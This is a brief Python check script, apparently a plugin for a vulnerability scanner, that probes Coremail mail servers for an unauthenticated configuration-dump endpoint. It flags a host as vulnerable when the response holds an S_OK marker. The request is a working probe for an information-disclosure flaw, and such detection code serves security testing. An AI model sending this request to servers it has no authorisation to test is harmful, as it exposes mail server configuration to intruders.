#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.COREMAIL

    async def prove(self):
        if self.base_url:
            url = self.base_url + 'mailsms/s?func=ADMIN:appState&dumpConfig=/'
            async with ClientSession() as session:
                async with session.get(url=url) as res:
                    if res!=None:
                        text = await res.text()
                        if res.status != 404 and "<code>S_OK</code>" in text:
                            yield url